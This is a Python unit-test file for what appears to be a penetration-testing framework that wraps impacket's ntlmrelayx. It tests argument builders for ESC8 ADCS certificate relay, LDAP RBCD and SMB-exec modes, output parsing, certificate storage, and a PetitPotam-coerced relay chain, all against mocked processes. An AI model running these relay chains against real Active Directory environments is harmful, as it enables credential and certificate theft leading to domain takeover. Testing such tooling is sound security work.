#!/usr/bin/env python3
"""ntlmrelayx wrap — D3.

D3 owns the listener lifecycle (spawn → bind-wait → capture → stop),
parses ntlmrelayx stdout into a RelayOutcome, and persists acquired
certificates into Store's new v7 certificate table.

Tests here cover:

  * argv builder — one flavor per RelayTarget.mode (adcs-cert /
    ldap-rbcd / smb-exec / socks);
  * output classifier — cert-ok / cred-ok / cred-fail / error branches
    from mocked stdout;
  * find_tool — PATH + arsenal_hint fallback + None case;
  * Store round-trip — reserve_chain_id → cert insert linked → finalize_chain;
  * chain step wiring — relay:listen without listener_ip stays manual,
    with mocked listener spawns and hands the URI to _petitpotam_action.
"""
import base64
import os
import sys
import tempfile
import unittest
from dataclasses import dataclass
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class RelayTargetShapeTest(unittest.TestCase):

    def test_mode_enum_gated(self):
        from fieldkit.relay import RelayTarget
        for mode in ("adcs-cert", "ldap-rbcd", "smb-exec", "socks"):
            RelayTarget(mode=mode, target="host")
        with self.assertRaises(ValueError):
            RelayTarget(mode="unknown", target="host")


class ArgvBuilderTest(unittest.TestCase):

    def test_adcs_cert_argv_matches_canonical_esc8(self):
        from fieldkit.relay import RelayTarget, _build_argv
        t = RelayTarget(mode="adcs-cert", target="ca.corp.local",
                        template="DomainController")
        argv = _build_argv("/usr/bin/impacket-ntlmrelayx",
                            t, port_smb=445, port_http=80,
                            bind_addr="0.0.0.0")
        # Load-bearing tokens for the esc8 relay flow.
        for tok in ("-smb2support", "--adcs", "--template",
                     "DomainController",
                     "http://ca.corp.local/certsrv/certfnsh.asp"):
            self.assertIn(tok, argv, f"argv missing {tok!r}: {argv}")

    def test_ldap_rbcd_argv(self):
        from fieldkit.relay import RelayTarget, _build_argv
        t = RelayTarget(mode="ldap-rbcd", target="dc.corp.local")
        argv = _build_argv("/usr/bin/x", t, 445, 80, "0.0.0.0")
        self.assertIn("--delegate-access", argv)
        self.assertIn("ldaps://dc.corp.local", argv)

    def test_smb_exec_argv(self):
        from fieldkit.relay import RelayTarget, _build_argv
        t = RelayTarget(mode="smb-exec", target="ws01.corp.local")
        argv = _build_argv("/usr/bin/x", t, 445, 80, "0.0.0.0")
        self.assertIn("smb://ws01.corp.local", argv)

    def test_socks_argv(self):
        from fieldkit.relay import RelayTarget, _build_argv
        t = RelayTarget(mode="socks", target="")
        argv = _build_argv("/usr/bin/x", t, 445, 80, "0.0.0.0")
        self.assertIn("--socks", argv)

    def test_extra_argv_is_appended(self):
        # extra_argv lets a chain step tack on --debug or -6 for
        # IPv6 without needing a builder override.
        from fieldkit.relay import RelayTarget, _build_argv
        t = RelayTarget(mode="adcs-cert", target="ca",
                        extra_argv=("--debug", "-6"))
        argv = _build_argv("/usr/bin/x", t, 445, 80, "0.0.0.0")
        self.assertIn("--debug", argv)
        self.assertIn("-6", argv)


class FindToolTest(unittest.TestCase):

    def test_prefers_impacket_ntlmrelayx_on_path(self):
        from fieldkit import relay
        with patch("shutil.which", side_effect=lambda n:
                    "/usr/bin/impacket-ntlmrelayx"
                    if n == "impacket-ntlmrelayx" else None):
            self.assertEqual(relay.find_tool(),
                              "/usr/bin/impacket-ntlmrelayx")

    def test_falls_back_to_arsenal_hint(self):
        from fieldkit import relay
        with tempfile.TemporaryDirectory() as tmp:
            p = os.path.join(tmp, "ntlmrelayx.py")
            with open(p, "w") as fh: fh.write("#!/usr/bin/env python3\n")
            os.chmod(p, 0o755)
            with patch("shutil.which", return_value=None):
                self.assertEqual(relay.find_tool(arsenal_hint=tmp), p)

    def test_none_when_missing(self):
        from fieldkit import relay
        with patch("shutil.which", return_value=None):
            self.assertIsNone(relay.find_tool())


class OutputClassifierTest(unittest.TestCase):

    def test_cert_ok_wins_over_other_signatures(self):
        # A real ntlmrelayx log includes cred-attempt lines BEFORE the
        # cert-ok line; the classifier must still return cert-ok.
        from fieldkit.relay import _classify_lines
        lines = [
            "[*] Authenticating against http://ca as CORP/DC01$",
            "[*] Requesting certificate for user CORP/DC01$",
            "[*] Base64 certificate of user CORP/DC01$",
            "MIIC" + "A" * 200,
            "AAAA" + "B" * 100,
        ]
        r = _classify_lines(lines)
        self.assertEqual(r.kind, "cert-ok")
        self.assertEqual(r.principal, "CORP/DC01$")
        # cert_bytes is the joined base64 payload, whitespace stripped
        self.assertGreater(len(r.cert_bytes), 200)

    def test_cred_ok_when_no_cert(self):
        from fieldkit.relay import _classify_lines
        lines = [
            "[*] Authenticating against smb://ws01 as CORP/svc-admin",
            "[+] SUCCESS! [+] Authenticating against smb://ws01",
        ]
        r = _classify_lines(lines)
        self.assertEqual(r.kind, "cred-ok")
        self.assertEqual(r.principal, "CORP/svc-admin")

    def test_cred_fail_on_logon_failure(self):
        from fieldkit.relay import _classify_lines
        r = _classify_lines(["STATUS_LOGON_FAILURE"])
        self.assertEqual(r.kind, "cred-fail")

    def test_error_on_unrecognized_output(self):
        # Deliberate: don't silently classify weird text.
        from fieldkit.relay import _classify_lines
        r = _classify_lines(["nothing useful", "another noise line"])
        self.assertEqual(r.kind, "error")


class ListenerBindTest(unittest.TestCase):
    """Fake subprocess + fake reader thread; verify start() correctly
    surfaces bind-ok, bind-fail, and timeout paths."""

    def _fake_popen(self, initial_lines, exit_code=None):
        """Build a MagicMock that quacks like a Popen — poll returns
        exit_code (None while running), stdout iteration yields the
        initial_lines then blocks forever."""
        import io
        # BufferedReader-like: iter() gives our lines then blocks; we
        # simulate that by using a small pipe with the lines pre-written.
        proc = MagicMock()
        proc.pid = 42424
        proc.poll = MagicMock(return_value=exit_code)
        proc.stdout = iter(f"{ln}\n" for ln in initial_lines)
        # stdout iteration ends after the lines; that's fine for our
        # timing: the reader thread drains and returns.
        return proc

    def test_bind_ok_signature_produces_listener_uri(self):
        from fieldkit.relay import RelayTarget, start
        proc = self._fake_popen(
            ["[*] Running in relay mode",
             "[*] Setting up SMB Server on port 445"])
        with patch("fieldkit.runner.spawn", return_value=proc), \
             patch("shutil.which", return_value="/usr/bin/impacket-ntlmrelayx"):
            listener = start(
                RelayTarget(mode="adcs-cert", target="ca"),
                listener_ip="10.0.0.5",
                bind_wait=2.0)
        self.assertEqual(listener.listener_uri, r"\\10.0.0.5\ANY")
        self.assertTrue(listener.captured_lines)

    def test_bind_fail_leaves_empty_listener_uri(self):
        from fieldkit.relay import RelayTarget, start
        proc = self._fake_popen(
            ["[!] Address already in use — cannot bind port 445"],
            exit_code=1)
        with patch("fieldkit.runner.spawn", return_value=proc), \
             patch("shutil.which", return_value="/usr/bin/impacket-ntlmrelayx"):
            listener = start(
                RelayTarget(mode="adcs-cert", target="ca"),
                listener_ip="10.0.0.5",
                bind_wait=2.0)
        self.assertEqual(listener.listener_uri, "")

    def test_no_tool_returns_stub_listener(self):
        from fieldkit.relay import RelayTarget, start
        with patch("shutil.which", return_value=None):
            listener = start(
                RelayTarget(mode="adcs-cert", target="ca"),
                listener_ip="10.0.0.5",
                bind_wait=0.1)
        self.assertEqual(listener.tool_bin, "")
        self.assertIsNone(listener.proc)


class WaitCaptureTest(unittest.TestCase):

    def _mk_listener(self, captured_lines, tool_bin="/usr/bin/x",
                     listener_uri=r"\\10.0.0.5\ANY", proc_alive=True):
        from fieldkit.relay import Listener, RelayTarget
        listener = Listener(
            tool_bin=tool_bin,
            target=RelayTarget(mode="adcs-cert", target="ca"),
            listener_uri=listener_uri,
            captured_lines=list(captured_lines))
        if proc_alive:
            proc = MagicMock()
            proc.poll = MagicMock(return_value=None)
            listener.proc = proc
        return listener

    def test_no_tool_short_circuits(self):
        from fieldkit.relay import wait_capture
        l = self._mk_listener([], tool_bin="")
        out = wait_capture(l, timeout=0.1)
        self.assertEqual(out.kind, "no-tool")

    def test_bind_fail_short_circuits(self):
        from fieldkit.relay import wait_capture
        l = self._mk_listener(["Address already in use"],
                              listener_uri="")
        out = wait_capture(l, timeout=0.1)
        self.assertEqual(out.kind, "bind-fail")

    def test_cert_ok_returns_immediately(self):
        from fieldkit.relay import wait_capture
        l = self._mk_listener([
            "[*] Authenticating against http://ca as CORP/DC01$",
            "[*] Base64 certificate of user CORP/DC01$",
            "MII" + "A" * 200,
        ])
        out = wait_capture(l, timeout=0.5)
        self.assertEqual(out.kind, "cert-ok")

    def test_timeout_kind_after_deadline(self):
        from fieldkit.relay import wait_capture
        l = self._mk_listener(["Running in relay mode"])
        # No cert/cred lines → poll to deadline → timeout.
        out = wait_capture(l, timeout=0.3, poll_interval=0.1)
        self.assertEqual(out.kind, "timeout")


class StoreCertRoundTripTest(unittest.TestCase):
    """v7 certificate table + reserve/finalize chain flow."""

    def _make_store(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        from fieldkit.state import Store
        s = Store.create(os.path.join(tmp.name, "e.db"))
        s.init_engagement("test")
        self.addCleanup(s.close)
        return s

    def test_add_certificate_persists_and_reads_back(self):
        s = self._make_store()
        cert_b64 = base64.b64encode(b"FAKE-PFX").decode()
        cid = s.add_certificate(principal="CORP/DC01$",
                                 cert_b64=cert_b64,
                                 template="DomainController")
        got = s.certificate_by_id(cid)
        self.assertEqual(got["principal"], "CORP/DC01$")
        self.assertEqual(got["cert_b64"], cert_b64)
        self.assertEqual(got["template"], "DomainController")
        self.assertEqual(got["source"], "relay-adcs")

    def test_certificates_filter_by_chain_id_and_principal(self):
        # chain_id is an FK — reserve real chain rows before linking
        # certs to them.
        from fieldkit.chain import Chain
        s = self._make_store()
        c1 = s.reserve_chain_id(Chain(profile="t", target="A", steps=()))
        c2 = s.reserve_chain_id(Chain(profile="t", target="B", steps=()))
        b = base64.b64encode(b"X").decode()
        s.add_certificate("CORP/A", b, chain_id=c1)
        s.add_certificate("CORP/B", b, chain_id=c1)
        s.add_certificate("CORP/A", b, chain_id=c2)
        self.assertEqual(len(s.certificates(chain_id=c1)), 2)
        self.assertEqual(len(s.certificates(principal="CORP/A")), 2)
        self.assertEqual(len(s.certificates(chain_id=c2,
                                              principal="CORP/A")), 1)

    def test_reserve_and_finalize_chain_persists_trail_once(self):
        from fieldkit.chain import esc8_chain, walk, Chain, Step, Outcome
        s = self._make_store()

        # A minimal 2-step chain we can walk cleanly.
        def _ok(c, x): return Outcome(kind="ok", evidence="fine")
        ch = Chain(profile="test", target="10.0.0.1",
                   steps=(Step("a", "preflight", _ok),
                          Step("b", "preflight", _ok)))

        chain_id = s.reserve_chain_id(ch)
        row = s.chain_by_id(chain_id)
        self.assertEqual(row["status"], "in_progress")
        self.assertEqual(row["profile"], "test")

        walk(ch, None)
        s.finalize_chain(chain_id, ch)

        row = s.chain_by_id(chain_id)
        self.assertEqual(row["status"], "proven")
        self.assertEqual(len(s.chain_step_trail(chain_id)), 2)

    def test_certificate_deletes_when_chain_deleted(self):
        # chain_id FK is ON DELETE SET NULL — the cert survives, its
        # chain reference clears. That's the right shape: a cert is
        # still valuable even if the chain row got pruned.
        s = self._make_store()
        b = base64.b64encode(b"X").decode()
        # Reserve a real chain, add a cert against it, then delete
        # the chain row.
        from fieldkit.chain import Chain
        ch = Chain(profile="test", target="10.0.0.1", steps=())
        cid = s.reserve_chain_id(ch)
        cert_id = s.add_certificate("CORP/X", b, chain_id=cid)
        s.conn.execute("DELETE FROM coerce_chain WHERE id = ?", (cid,))
        got = s.certificate_by_id(cert_id)
        self.assertIsNotNone(got)                # cert survived
        self.assertIsNone(got["chain_id"])       # link cleared


class ChainRelayIntegrationTest(unittest.TestCase):
    """The esc8 relay:listen + relay:capture steps end-to-end with a
    fake ntlmrelayx binary."""

    def _walk_chain(self, ctx_overrides=None, capture_lines=None,
                    cert_bytes="MIIABC" + "A" * 200):
        from fieldkit.chain import esc8_chain, walk, Chain
        from fieldkit import relay as relay_mod

        # Trim the chain down to relay:listen + relay:capture so the
        # test isn't dependent on reachability / coerce / post-relay.
        full = esc8_chain("10.0.0.1")
        by_name = {s.name: s for s in full.steps}
        ch = Chain(profile="esc8", target="10.0.0.1",
                   steps=(by_name["relay:listen"],
                          by_name["relay:capture"]))

        class Ctx:
            listener_ip = "10.0.0.5"
            ca_endpoint = "ca.corp.local"
            template = "DomainController"
            relay_port_smb = 4445
            relay_port_http = 8080
            relay_bind_addr = "0.0.0.0"
            relay_tool_bin = "/usr/bin/impacket-ntlmrelayx"
            relay_bind_wait = 1.0
            relay_wait_capture = 1.0
            store = None
        for k, v in (ctx_overrides or {}).items():
            setattr(Ctx, k, v)

        # Fake the ntlmrelayx subprocess.
        lines = capture_lines or [
            "[*] Running in relay mode",
            "[*] Setting up SMB Server on port 4445",
            "[*] Authenticating against http://ca.corp.local as CORP/DC01$",
            "[*] Base64 certificate of user CORP/DC01$",
            cert_bytes,
        ]
        proc = MagicMock()
        proc.pid = 4242
        proc.poll = MagicMock(return_value=None)
        proc.stdout = iter(f"{ln}\n" for ln in lines)
        proc.send_signal = MagicMock()
        proc.wait = MagicMock(return_value=0)
        proc.kill = MagicMock()

        with patch("fieldkit.runner.spawn", return_value=proc):
            walk(ch, Ctx())
        return ch

    def test_relay_listen_manual_when_no_listener_ip(self):
        ch = self._walk_chain(ctx_overrides={"listener_ip": None})
        self.assertEqual(ch.outcomes[0].kind, "manual")
        self.assertIn("listener_ip", ch.outcomes[0].evidence)

    def test_relay_listen_manual_when_no_ca(self):
        ch = self._walk_chain(ctx_overrides={"ca_endpoint": None})
        self.assertEqual(ch.outcomes[0].kind, "manual")
        self.assertIn("ca_endpoint", ch.outcomes[0].evidence)

    def test_relay_listen_ok_then_capture_ok(self):
        ch = self._walk_chain()
        self.assertEqual(ch.outcomes[0].kind, "ok",
                         msg=f"listen evidence: {ch.outcomes[0].evidence!r}")
        self.assertEqual(ch.outcomes[1].kind, "ok",
                         msg=f"capture evidence: {ch.outcomes[1].evidence!r}")
        # Chain artifacts thread through: listen sets listener_uri,
        # capture sets cert_principal + cert_bytes.
        self.assertIn("relay_listener_uri", ch.artifacts)
        self.assertEqual(ch.artifacts.get("cert_principal"), "CORP/DC01$")

    def test_relay_capture_persists_cert_when_store_supplied(self):
        # Give the ctx a real Store; expect a certificate row to
        # appear after the walk, linked to the chain.
        from fieldkit.state import Store
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        s = Store.create(os.path.join(tmp.name, "e.db"))
        s.init_engagement("test")
        self.addCleanup(s.close)
        ch = self._walk_chain(ctx_overrides={"store": s})
        # No chain_id was passed on ctx — cert lands with chain_id=None
        # which is fine (chain_id FK is nullable).
        certs = s.certificates()
        self.assertEqual(len(certs), 1)
        self.assertEqual(certs[0]["principal"], "CORP/DC01$")
        self.assertTrue(certs[0]["cert_b64"])

    def test_capture_timeout_maps_to_fail(self):
        # Listener bound OK but no cert/cred lines arrived within
        # relay_wait_capture — chain returns fail.
        ch = self._walk_chain(
            capture_lines=["[*] Running in relay mode",
                           "[*] Setting up SMB Server on port 4445"],
            ctx_overrides={"relay_wait_capture": 0.3})
        self.assertEqual(ch.outcomes[0].kind, "ok")     # listen ok
        self.assertEqual(ch.outcomes[1].kind, "fail")   # capture timeout
        self.assertIn("no auth", ch.outcomes[1].evidence)


if __name__ == "__main__":
    unittest.main()
